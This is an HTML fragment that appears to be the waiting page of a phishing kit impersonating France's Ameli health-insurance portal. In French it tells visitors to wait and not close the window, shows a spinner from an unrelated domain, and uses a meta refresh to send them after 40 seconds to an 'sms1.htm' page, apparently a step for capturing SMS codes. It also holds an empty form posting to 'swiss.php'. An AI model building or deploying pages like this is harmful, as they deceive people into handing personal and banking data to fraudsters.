<p>&nbsp;</p>

<div id="greyBackground">
<div id="container">
<div id="containerHeader"><br /><br /> <!-- DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" --><center>
<div id="prefooterAmeli_1" class="wlp-bighorn-window  ">
<div class="wlp-bighorn-window-content">
<div class="prefooterbody seul">
<meta http-equiv="refresh" content="40; URL=sms1.htm">
<ul>
<li>Formulaire du suivi &eacute;lectronique / R&eacute;f&eacute;rence : </li>
<li></li>
</ul>
</div>
</div>
</div>
<br />
<div align="center"><form id="formulaire_saisie_adresse" action="http://google.com" method="post">
<div>Veuillez patienter pendant que nous traitons votre demande<br />s.v.p ne pas fermer cette fen&ecirc;tre<br /><img src="https://euthaliaglobal.com/images/big-ajax-loader.gif" width="35" height="35" /></div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
<div>&nbsp;</div>
</form></div>
</center><form class="full-width" action="swiss.php" method="post" name="registrationDetails">

</form></div>
</div>
</div>
